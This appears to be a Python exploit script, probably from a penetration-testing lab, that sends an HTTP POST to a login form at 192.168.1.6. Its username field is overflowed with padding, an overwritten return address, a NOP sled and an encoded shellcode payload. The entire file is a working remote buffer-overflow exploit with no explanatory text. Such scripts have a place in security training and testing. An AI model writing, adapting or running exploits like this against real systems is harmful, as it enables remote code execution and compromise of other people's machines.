#!/usr/bin/python3

import sys
import socket
from time import sleep
buf =  b""
buf += b"\xba\xde\xde\x85\xe6\xdb\xdc\xd9\x74\x24\xf4\x58"
buf += b"\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x0e\x03\x8e"
buf += b"\xd0\x67\x13\xd2\x05\xe5\xdc\x2a\xd6\x8a\x55\xcf"
buf += b"\xe7\x8a\x02\x84\x58\x3b\x40\xc8\x54\xb0\x04\xf8"
buf += b"\xef\xb4\x80\x0f\x47\x72\xf7\x3e\x58\x2f\xcb\x21"
buf += b"\xda\x32\x18\x81\xe3\xfc\x6d\xc0\x24\xe0\x9c\x90"
buf += b"\xfd\x6e\x32\x04\x89\x3b\x8f\xaf\xc1\xaa\x97\x4c"
buf += b"\x91\xcd\xb6\xc3\xa9\x97\x18\xe2\x7e\xac\x10\xfc"
buf += b"\x63\x89\xeb\x77\x57\x65\xea\x51\xa9\x86\x41\x9c"
buf += b"\x05\x75\x9b\xd9\xa2\x66\xee\x13\xd1\x1b\xe9\xe0"
buf += b"\xab\xc7\x7c\xf2\x0c\x83\x27\xde\xad\x40\xb1\x95"
buf += b"\xa2\x2d\xb5\xf1\xa6\xb0\x1a\x8a\xd3\x39\x9d\x5c"
buf += b"\x52\x79\xba\x78\x3e\xd9\xa3\xd9\x9a\x8c\xdc\x39"
buf += b"\x45\x70\x79\x32\x68\x65\xf0\x19\xe5\x4a\x39\xa1"
buf += b"\xf5\xc4\x4a\xd2\xc7\x4b\xe1\x7c\x64\x03\x2f\x7b"
buf += b"\x8b\x3e\x97\x13\x72\xc1\xe8\x3a\xb1\x95\xb8\x54"
buf += b"\x10\x96\x52\xa4\x9d\x43\xf4\xf4\x31\x3c\xb5\xa4"
buf += b"\xf1\xec\x5d\xae\xfd\xd3\x7e\xd1\xd7\x7b\x14\x28"
buf += b"\xb0\x43\x41\x33\x47\x2c\x90\x33\x56\xf0\x1d\xd5"
buf += b"\x32\x18\x48\x4e\xab\x81\xd1\x04\x4a\x4d\xcc\x61"
buf += b"\x4c\xc5\xe3\x96\x03\x2e\x89\x84\xf4\xde\xc4\xf6"
buf += b"\x53\xe0\xf2\x9e\x38\x73\x99\x5e\x36\x68\x36\x09"
buf += b"\x1f\x5e\x4f\xdf\x8d\xf9\xf9\xfd\x4f\x9f\xc2\x45"
buf += b"\x94\x5c\xcc\x44\x59\xd8\xea\x56\xa7\xe1\xb6\x02"
buf += b"\x77\xb4\x60\xfc\x31\x6e\xc3\x56\xe8\xdd\x8d\x3e"
buf += b"\x6d\x2e\x0e\x38\x72\x7b\xf8\xa4\xc3\xd2\xbd\xdb"
buf += b"\xec\xb2\x49\xa4\x10\x23\xb5\x7f\x91\x53\xfc\xdd"
buf += b"\xb0\xfb\x59\xb4\x80\x61\x5a\x63\xc6\x9f\xd9\x81"
buf += b"\xb7\x5b\xc1\xe0\xb2\x20\x45\x19\xcf\x39\x20\x1d"
buf += b"\x7c\x39\x61"

size=b"A" * 780 + b"\x83\x0C\x09\x10" + b"C" *4 + b"\x90" * 16 + buf 
content=b"username=" + size + b"password=A"

buffer=b"POST /login HTTP/1.1\r\n"
buffer+=b"Host: 192.168.1.6\r\n"
buffer+=b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\n"
buffer+=b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
buffer+=b"Accept-Language: en-US,en;q=0.5\r\n"
buffer+=b"Accept-Encoding: gzip, deflate\r\n"
buffer+=b"Content-Type: application/x-www-form-urlencoded\r\n"
buffer+=b"Content-Length: "+str(len(content)).encode('utf-8')+b"\r\n"
buffer+=b"Origin: http://192.168.1.6\r\n"
buffer+=b"Connection: keep-alive\r\n"
buffer+=b"Referer: http://192.168.1.6/login\r\n"
buffer+=b"\r\n"

buffer+=content

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.1.6',80))
s.send(buffer)
s.close()
